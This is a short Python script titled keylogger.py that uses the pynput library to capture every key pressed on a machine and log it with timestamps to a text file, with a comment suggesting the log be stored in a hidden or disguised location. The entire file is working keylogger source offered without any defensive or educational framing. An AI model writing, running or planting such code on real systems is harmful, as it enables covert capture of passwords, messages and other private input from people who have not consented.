# keylogger.py

from pynput import keyboard
import logging

# Optional: save log file to a hidden or disguised location
log_file = "key_log.txt"

# Configure logging
logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s: %(message)s")

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key: {key}")

# Start listening
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
